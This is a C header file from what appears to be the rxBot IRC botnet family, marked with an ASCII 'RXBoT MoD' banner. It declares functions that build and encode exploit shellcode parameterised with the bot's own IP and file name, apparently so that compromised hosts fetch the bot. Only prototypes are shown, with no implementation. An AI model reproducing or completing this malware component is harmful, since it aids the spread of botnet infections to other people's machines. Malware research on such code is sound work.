//==========================================================================\\
//=       ===   ==   ==      =====      =========  =====  ===      ======  =\\
//=  ====  ===  ==  ===  ===  ===   ==   ========   ===   ==   ==   =====  =\\
//=  ====  ===  ==  ===  ====  ==  ====  ===  ===  =   =  ==  ====  =====  =\\
//=  ===   ====    ====  ===  ===  ====  ==    ==  == ==  ==  ====  =====  =\\
//=      =======  =====      ====  ====  ===  ===  =====  ==  ====  ===    =\\
//=  ====  ====    ====  ===  ===  ====  ===  ===  =====  ==  ====  ==  =  =\\
//=  ====  ===  ==  ===  ====  ==  ====  ===  ===  =====  ==  ====  ==  =  =\\
//=  ====  ===  ==  ===  ===  ===   ==   ===  ===  =====  ==   ==   ==  =  =\\
//=  ====  ==  ====  ==      =====      ====   ==  =====  ===      ====    =\\
//==========================================================================\\
//////RXB()tM()d/////////BuZ-MoD///////RXB()tM()d////////BuZ-MoD////////////\\
//////////////////////////////////////////////////////////////////////////////


 
DWORD GetShellcodeSize(char *ownip, char *botfilename);
DWORD GetShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0TerminatedShellcodeSize(char *ownip, char *botfilename);
DWORD GetRNS0TerminatedShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0EncodedSize(DWORD shellcodesize);
DWORD EncodeRNS0(char *buffer, DWORD buffersize, char *shellcode, DWORD shellcodesize);
